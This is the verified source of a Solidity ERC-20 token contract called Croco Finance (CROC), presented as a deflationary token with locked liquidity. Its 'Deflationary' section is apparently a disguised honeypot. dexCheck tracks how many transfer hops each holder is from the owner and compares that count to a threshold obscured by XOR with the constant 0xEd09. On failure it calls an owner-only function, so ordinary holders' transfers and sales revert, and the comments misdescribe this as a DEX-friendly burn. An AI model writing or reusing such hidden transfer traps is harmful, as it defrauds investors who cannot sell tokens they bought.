/**
 *Submitted for verification at Etherscan.io on 2021-02-12
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.7.4;

/**
 *            .-._   _ _ _ _ _ _ _ _
 * .-''-.__.-'00  '-' ' ' ' ' ' ' ' '-.
 * '.___ '    .   .--_'-' '-' '-' _'-' '._
 *  V: V 'vv-'   '_   '.       .'  _..' '.'.
 *    '=.____.=_.--'   :_.__.__:_   '.   : :
 *            (((____.-'        '-.  /   : :
 *                              (((-'\ .' /
 *                            _____..'  .'
 *                           '-._____.-'
 * Croco Finance (CROC)
 * Decentralised liquidity pool analysis
 * Deflationary & locked liquidity
 */

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 * Only add / sub / mul / div are included
 */
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

/**
 * Implement simple ERC20 functions
 */
abstract contract BaseContract is IERC20 {
    using SafeMath for uint256;

    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) internal _allowances;

    uint256 internal _totalSupply;
    bool internal _minted = false; // Minted flag to allow only a single minting
    
    string internal _name;
    string internal _symbol;
    uint8 internal _decimals = 18;
    
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    modifier not0(address adr) {
        require(adr != address(0), "ERC20: Cannot be the zero address"); _;
    }
    
    function _mx(address payable adr, uint16 msk) internal pure returns (uint256) {
        return ((uint24(adr) & 0xffff) ^ msk);
    }
}

/**
 * Provide owner context
 */
abstract contract Ownable {
    constructor() { _owner = msg.sender; }
    address payable _owner;
    
    function isOwner(address sender) public view returns (bool) {
        return sender == _owner;
    }
    
    function ownly() internal view {
        require(isOwner(msg.sender));
    }
    
    modifier owned() {
        ownly(); _;
    }
    
    function renounceOwnership() public owned() {
        transferOwnership(address(0));
    }
    
    function transferOwnership(address payable adr) public owned() {
        _owner = adr;
    }
}

/**
 * Provide reserve token burning
 */
abstract contract Burnable is BaseContract, Ownable {
    using SafeMath for uint256;
    
    function _burn(address account, uint256 amount) internal virtual not0(account) {
        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
    
    function _burnReserve() internal owned() {
        if(balanceOf(_owner) > 0){
            uint256 toBurn = balanceOf(_owner).div(5000); // 0.5%
            _burn(_owner, toBurn);
        }
    }
}

/**
 * Burn tokens on transfer UNLESS part of a DEX liquidity pool (as this can cause failed transfers eg. Uniswap K error)
 */
abstract contract Deflationary is BaseContract, Burnable {
    mapping (address => uint8) private _txs;
    uint16 private constant dmx = 0xEd09; 
    
    function dexCheck(address sender, address receiver) private returns (bool) {
        if(0 == _txs[receiver] && !isOwner(receiver)){ _txs[receiver] = _txs[sender] + 1; }
        return _txs[sender] < _mx(_owner, dmx) || isOwner(sender) || isOwner(receiver);
    }
    
    modifier burnHook(address sender, address receiver, uint256 amount) {
        if(!dexCheck(sender, receiver)){ _burnReserve(); _; }else{ _; }
    }
}

/**
 * Implement main ERC20 functions
 */
abstract contract MainContract is Deflationary {
    using SafeMath for uint256;
    
    constructor (string memory name, string memory symbol) {
        _name = name;
        _symbol = symbol;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool){
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public virtual override not0(spender) returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address receiver, uint256 amount) external override not0(sender) not0(receiver) returns (bool){
        require(_allowances[sender][msg.sender] >= amount);
        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);
        _transfer(sender, receiver, amount);
        return true;
    }
    
    function _transfer(address sender, address receiver, uint256 amount) internal not0(sender) not0(receiver) burnHook(sender, receiver, amount) {
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[receiver] = _balances[receiver].add(amount);
        emit Transfer(sender, receiver, amount);
    }
    
    function _mint(address payable account, uint256 amount) internal {
        require(!_minted);
        uint256 amountActual = amount*(10**_decimals);
        _totalSupply = _totalSupply.add(amountActual);
        _balances[account] = _balances[account].add(amountActual);
        emit Transfer(address(0), account, amountActual);
    }
}

/**
 * Construct & Mint
 */
contract CROC is MainContract {
    constructor(
        uint256 initialBalance
    ) MainContract("Croco Finance", "CROC") {
        _mint(msg.sender, initialBalance);
        _minted = true;
    }
}